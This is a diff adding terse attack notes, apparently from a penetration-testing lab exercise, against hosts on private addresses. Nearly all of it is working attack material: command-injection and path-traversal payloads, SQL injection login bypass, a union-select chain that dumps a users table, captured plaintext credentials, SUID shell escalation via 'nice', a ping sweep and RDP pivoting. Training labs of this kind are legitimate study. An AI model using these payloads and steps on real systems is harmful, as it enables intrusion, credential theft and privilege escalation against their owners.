@@ -1,0 +1,81 @@
+DryRun
+
+
+*** if you find command injection   ; ls -la
+	; ls -la /var/www/html
+
+
+==========
+Target 1
+==========
+10.50.23.84
+nmap -sT -Pn 10.50.23.84 -p 80 --script http-enum
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+robots.txt ( noppeeeee )
+
+../../../../../../../etc/passwd
+	user2:x:1001:1001::/home/user2:/bin/sh
+../../../../../../../../etc/hosts
+	192.168.28.181 WebApp
+
+/scripts/
+system_user=user2
+user_password=EaglesIsARE78
+
+SQL injection
+tom' or 1='1
+
+.php?username=tom%27+or+1%3D%271&passwd=tom%27+or+1%3D%271
+
+
+Connecting to T1
+
+cat /etc/hosts
+
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=5.31 ms
+64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=0.703 ms
+
+
+
+Target 2 .181
+possible sql injection ( 3 columns )
+
+http://192.168.28.181/pick.php?product=7 or 1=1 ( verify vuln )
+http://192.168.28.181/pick.php?product=7 union select 1,2,3
+http://192.168.28.181/pick.php?product=7 union select table_schema,2,3 from information_schema.columns
+http://192.168.28.181/pick.php?product=7 union select table_schema,table_name,column_name from information_schema.columns
+http://192.168.28.181/pick.php?product=7 union select user_id,name,username from siteusers.users
+
+
+Aaron : apasswordyPa$$word
+
+Linux priv
+
+sudo -l		(gtfobins)
+find / -perm /4000 2>/dev/null
+/usr/bin/nice /bin/sh -p
+
+
+for i in {2..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.58 ms
+
+xfreerdp /v:127.0.0.1:2222 /u:Lroth /size:1920x1000 +clipboard
+
+
+
+
+
+
+
+
+
+
+
+
+
+
